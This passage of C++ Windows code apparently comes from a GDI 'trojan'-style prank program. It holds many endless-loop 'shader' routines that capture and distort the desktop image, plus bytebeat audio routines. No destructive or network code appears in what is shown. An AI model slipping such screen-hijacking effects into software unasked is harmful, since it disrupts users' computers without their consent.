    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int rgb = RndRGB;
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb ^= rgb + x;
            }
        }
        StretchBlt(hcdc, 0, h / 3, (w / 3) * 2, (h / 3) * 2, hcdc, 0, 0, w, h, SRCCOPY);
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hdc2);
        Sleep(100);
    }
}
DWORD WINAPI Shader10_NoName9(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                int rgb = (rgbquad[x + w * y].r + rgbquad[x + w * y].g + rgbquad[x + w * y].b) / 3;
                rgbquad[x + w * y].rgb += RGB(100, 100, 100) ^ (1000 + (x ^ y)) + rgb;
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hdc2);
        Sleep(100);
    }
}
DWORD WINAPI Shader11_NoName10(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc2 = GetDC(GDIWindow);
        for (int y = 0; y < h; y++) {
            int rgb = Hue(239);
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb = rgb + (x & y);
            }
        }
        BLENDFUNCTION blf = { 0 };
        blf.BlendOp = AC_SRC_OVER;
        blf.BlendFlags = 0;
        blf.SourceConstantAlpha = 180;
        blf.AlphaFormat = 0;
        AlphaBlend(hdc2, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(0, hdc2);
        Sleep(100);
    }
}
DWORD WINAPI Shader12_NoName11(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            int rgb = RndRGB % (y + 1);
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb *= rgb >> x;
            }
        }
        StretchBlt(hdc2, -10, -10, w + 20, h + 20, hcdc, 0, 0, w, h, SRCCOPY);
        ReleaseDC(0, hdc2);
        Sleep(100);
    }
}
DWORD WINAPI Shader13_NoName12(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t += 20) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].r = x + t | y + t;
                rgbquad[x + w * y].g = x - t | y - t;
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc2);
        Sleep(100);
    }
}
DWORD WINAPI Shader14_NoName13(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t += 20) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int x2 = rand() % 200 - 100;
        int y2 = rand() % 200 - 100;
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].r = GetRValue((x + x2) | (y + y2));
                rgbquad[x + w * y].g += GetGValue(x * y) * t;
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc2);
        Sleep(100);
    }
}
DWORD WINAPI Shader15_NoName14(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t += 20) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            rgbquad[y].rgb = y - 8 | y;
            int rrr = rand() % 20;
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb = RGB((rgbquad[y].r + rgbquad[y].g + rgbquad[y].b) / 3 + t + rrr + x | y, (rgbquad[y].r + rgbquad[y].g + rgbquad[y].b) / 3 + t + rrr + x | y, (rgbquad[y].r + rgbquad[y].g + rgbquad[y].b) / 3 + t + rrr + x | y);
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc2);
        Sleep(100);
    }
}
DWORD WINAPI Shader16_NoName15(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += RGB("/,\x88[ 6asfi"[x | y % 10], x | y * x, 10);
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc2);
        Sleep(100);
    }
}
DWORD WINAPI Shader17_NoName16(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,-h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        PRGBQUAD rgbtmp = (PRGBQUAD)LocalAlloc(LMEM_FIXED, (size_t)w * h * sizeof(RGBQUAD));
        memcpy(rgbtmp, rgbquad, (size_t)w * h * sizeof(RGBQUAD));
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                int rgb = 0;
                if (!(x == 0 || y == 0))rgb = (rgbtmp[(x - 1) + w * (y - 1)].r + rgbtmp[(x - 1) + w * (y - 1)].g + rgbtmp[(x - 1) + w * (y - 1)].b) / 3;
                rgbquad[x + w * y].rgb += RGB(rgb, rgb, rgb);
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc2);
        Sleep(5);
    }
}
DWORD WINAPI Shader18_NoName17(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,-h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += x | y;
                rgbquad[x + w * y].r += rgbquad[x + w * y].g | x;
                rgbquad[x + w * y].g += rgbquad[x + w * y].b | rgbquad[x + w * y].g;
                rgbquad[x + w * y].b += rgbquad[x + w * y].r | y;
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc2);
        Sleep(5);
    }
}
DWORD WINAPI Shader19_NoName18(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,-h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += sqrt(x + w * y) + x * cos(x | y) - y * sin(x ^ y);
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, MERGEPAINT);
        ReleaseDC(0, hdc2);
        Sleep(5);
    }
}
DWORD WINAPI Shader20_NoName19(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,-h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += x | y;
                rgbquad[x + w * y].r += x & y + y;
                rgbquad[x + w * y].b *= x * y | 78;
                rgbquad[x + w * y].rgb -= x - y & y;
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCERASE);
        ReleaseDC(0, hdc2);
        Sleep(5);
    }
}
DWORD WINAPI Shader21_NoName20(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,-h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) { 
                rgbquad[x + w * y].rgb += x - y & y * y;
                rgbquad[x + w * y].rgb |= x + y & x;
                rgbquad[x + w * y].rgb &= x | y * y;
            }
        }
        BitBlt(hdc2, 20, -10, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc2);
        Sleep(5);
    }
}
DWORD WINAPI Shader22_NoName21(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,-h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb -= x | y + (x + w * y);
                rgbquad[x + w * y].rgb ^= x | y + (x + w * y);
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc2);
        Sleep(5);
    }
}
DWORD WINAPI Shader23_NoName22(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,-h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += RGB(sqrt(y), sqrt(y), sqrt(y)) | (int)sqrt(x);
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCAND);
        ReleaseDC(0, hdc2);
        Sleep(5);
    }
}
DWORD WINAPI Shader24_NoName23(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,-h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += sin(sqrt(x)+cbrt(y));
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCERASE);
        ReleaseDC(0, hdc2);
        Sleep(5);
    }
}
DWORD WINAPI Shader25_NoName24(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,-h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += (int)cos(x * PI) * w + (int)sin(y * PI) * h | x | y;
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc2);
        Sleep(5);
    }
}
DWORD WINAPI Shader26_NoName25(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,-h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += (x & y) + (x | y) ^ (x + w * y) * y;
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc2);
        Sleep(5);
    }
}
DWORD WINAPI Shader27_NoName26(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,-h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t += 20) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb = RGB((t + x) & y, (t + x) & y, (t + x) & (y + x));
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc2);
        Sleep(5);
    }
}
DWORD WINAPI Shader28_Last(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc), hdc2;
    BITMAPINFO bmi = { 40,w,-h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc2 = GetDC(GDIWindow);
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rand() % 2 ? rgbquad[x + w * y].rgb = RndRGB : 0;
            }
        }
        BitBlt(hdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc2);
        Sleep(5);
    }
}
void sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(tan(t >> 5 | t >> 8) * 3.2 * t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(104 * ((t * ((t >> 5) / 14 & 19) / 4)) | 64);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 23 >> 4 | t & 3 >> 5 & t ^ 6) + 1 ^ t >> (t & 16234 ? 4 : 5));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (LONGLONG t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<unsigned char>(((int)(2.0 * sin((double)(t * (t >> 6) | t | (5 * t & t >> 7) & t)) + 128.0)) & t & 200);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (15 & t >> 5 | t >> 9));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t | t >> 3) - (t & t >> 8) - (t & t >> 7) - (t & t >> 9) ^ rand() % 48);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(78 * (t >> 13 | t >> 4 | t >> 7) ^ 45 & (t >> 2 | t >> 4) - (int)tan(2789 * t | (t >> 12 | t >> 3)) * 8);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 5 * (5 * t >> 6 | 5 * t >> 4 & 5 * t >> 9 | 5 * t >> 3 | 5 * t >> (5 * t >> 7)) & t * 5 >> 10) - 1);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((int)(2.0 * cos((double)(t * 2 & t >> 7 | t)) + 256.0) | ((t << 1) + (t >> 7) & t >> 4));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound10() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((0x78917891 >> (t >> 1) & 0x234) | t >> 1 + (((t >> 3) * 5) & 0xC) & t * 5 >> 6) - t * (t >> 4 & t >> 5 | t * 2 >> 3));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound11() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
